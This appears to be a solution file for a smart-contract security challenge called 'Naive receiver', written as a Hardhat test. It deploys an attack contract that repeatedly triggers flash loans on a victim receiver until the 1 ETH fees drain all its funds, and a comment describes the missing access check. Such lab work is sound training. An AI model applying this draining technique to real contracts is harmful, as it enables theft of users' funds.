const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
        // console.log(await ethers.provider.getBalance(deployer.address));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
        /**
         * I created an AttackNaiveReceiver contract, with method that runs lenders' method flashLoan with a loop as long as receiver has 1 eth.
         * This is created, because eceiver check who is the owner of the contract, so attacker can run flashLoan and because fee is 1 ETH
         * receiver will quickly loose all ethers.
         * Receiver checks if the sender is pool, but that is not enough.
         * 
         * To remember: allways check who has right to has access to call contract's functions
         */
        const AttackNaiveReceiver = await ethers.getContractFactory('AttackNaiveReceiver', deployer);
        this.attack = await AttackNaiveReceiver.deploy();
        await this.attack.attack(this.pool.address, this.receiver.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
